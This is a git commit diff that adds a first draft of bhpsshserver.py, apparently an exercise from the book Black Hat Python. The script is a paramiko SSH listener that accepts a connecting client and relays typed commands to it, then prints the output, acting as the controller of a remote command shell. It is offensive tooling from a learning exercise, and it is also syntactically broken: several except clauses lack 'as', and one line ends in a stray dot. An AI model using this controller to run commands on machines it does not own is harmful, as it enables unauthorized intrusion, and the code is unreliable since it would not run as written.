c2840d7f9c6a2501b2c53e28470f4e02805a62d5
Michael DeRuiter <michaelalanderuiter@protonmail.com>
2022-09-24 18:42:45 -0500

    bhpsshserver.py: Initial draft

--- 1e/bhpsshserver.py
+++ 1e/bhpsshserver.py
@@ -26,3 +26,52 @@ class Server (paramiko.ServerInterface):
 server = sys.argv[1]
 ssh_port = int(sys.argv[2])
 
+try:
+  sock = socket.socket(socket.AF_INET, 
+                       socket.SOCK_STREAM)
+  sock.setsockopt(socket.SOL_SOCKET,
+                  socket.SO_REUSEADDR, 1)
+  sock.bind((server,ssh_port))
+  sock.listen(100)
+  print '[+] Listening for connection ...'
+  client, addr = sock.accept()
+except Exception e:
+  print '[-] Listen failed: ' + str(e)
+  sys.exit(1)
+  
+print '[+] Got a connection!'
+
+try:
+  bhSession = paramiko.Transport(client)
+  bhSession.add_server_key(host_key)
+  server = Server()
+  try:
+    bhSession.start_server(server=server)
+  except paramiko.SSHException x:
+    print '[-] SSH negotiation failed.'
+  chan = bhSession.accept(20)
+  print '[+] Authenticated!'
+  print chan.recv(1024)
+  chan.send('Welcome to bh_ssh')
+  while True:
+    try:
+      command = raw_input("Enter command: ").
+                strip('\n')
+      if command != 'exit':
+        chan.send(command)
+        print chan.recv(1024) + '\n'
+      else:
+        chan.send('exit')
+        print 'Exiting...'
+        bhSession.close()
+        raise Exception('exit')
+    except KeyboardInterrupt:
+      bhSession.close()
+except Exception e:
+  print '[-] Caught exception: ' + str(e)
+  try:
+    bhSession.close()
+  except:
+    pass
+  sys.exit(1)
+      
